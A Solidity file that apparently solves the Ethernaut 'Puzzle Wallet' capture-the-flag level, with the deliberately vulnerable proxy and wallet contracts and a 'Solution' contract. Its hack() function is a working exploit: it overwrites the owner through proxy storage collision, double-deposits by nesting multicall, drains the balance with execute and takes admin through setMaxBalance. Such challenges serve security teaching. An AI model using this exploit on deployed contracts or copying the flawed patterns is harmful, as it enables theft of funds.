// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./UpgradeableProxy.sol";

import "hardhat/console.sol";

contract PuzzleProxy is UpgradeableProxy {
  address public pendingAdmin;
  address public admin;

  constructor(
    address _admin,
    address _implementation,
    bytes memory _initData
  ) UpgradeableProxy(_implementation, _initData) {
    admin = _admin;
  }

  modifier onlyAdmin() {
    require(msg.sender == admin, "Caller is not the admin");
    _;
  }

  function proposeNewAdmin(address _newAdmin) external {
    pendingAdmin = _newAdmin;
  }

  function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
    require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
    admin = pendingAdmin;
  }

  function upgradeTo(address _newImplementation) external onlyAdmin {
    _upgradeTo(_newImplementation);
  }
}

contract PuzzleWallet {
  address public owner;
  uint256 public maxBalance;
  mapping(address => bool) public whitelisted;
  mapping(address => uint256) public balances;

  function init(uint256 _maxBalance) public {
    require(maxBalance == 0, "Already initialized");
    maxBalance = _maxBalance;
    owner = msg.sender;
  }

  modifier onlyWhitelisted() {
    require(whitelisted[msg.sender], "Not whitelisted");
    _;
  }

  function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
    require(address(this).balance == 0, "Contract balance is not 0");
    maxBalance = _maxBalance;
  }

  function addToWhitelist(address addr) external {
    require(msg.sender == owner, "Not the owner");
    whitelisted[addr] = true;
  }

  function deposit() external payable onlyWhitelisted {
    require(address(this).balance <= maxBalance, "Max balance reached");
    balances[msg.sender] += msg.value;
  }

  function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
    require(balances[msg.sender] >= value, "Insufficient balance");
    balances[msg.sender] -= value;
    (bool success, ) = to.call{value: value}(data);
    require(success, "Execution failed");
  }

  function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
      console.log("i", i);
      bytes memory _data = data[i];
      bytes4 selector;
      assembly {
        selector := mload(add(_data, 32))
      }
      if (selector == this.deposit.selector) {
        console.log("is deposit", i);

        require(!depositCalled, "Deposit can only be called once");
        // Protect against reusing msg.value
        depositCalled = true;
      }
      (bool success, ) = address(this).delegatecall(data[i]);
      console.log("is success", success);

      require(success, "Error while delegating call");
    }
  }
}

contract Solution {
  constructor() payable {}

  address payable public proxyAddr = payable(0x70560f5820991B032EF8051F892c056Aede298De);
  address public myAddr = 0x26750470f82Ba05892fb0088ebE48b1E19d30514;

  function hack() public {
    // propose my address as admin
    PuzzleProxy(proxyAddr).proposeNewAdmin(address(this));

    // white list me
    PuzzleWallet(proxyAddr).addToWhitelist(address(this));
    // execute a delegate call to approve the new admin proposal
    bytes[] memory nestedCall = new bytes[](1);
    bytes[] memory calls = new bytes[](2);
    nestedCall[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

    calls[0] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCall);
    calls[1] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

    // this will deposit twice 0,001 with only one data value
    PuzzleWallet(proxyAddr).multicall{value: 0.001 ether}(calls);

    // execute to send the contract tokens
    PuzzleWallet(proxyAddr).execute(myAddr, 0.002 ether, "");

    // set in the max balance my addr
    PuzzleWallet(proxyAddr).setMaxBalance(uint256(uint160(myAddr)));
  }

  function otherHack() external {}

  receive() external payable {}
}
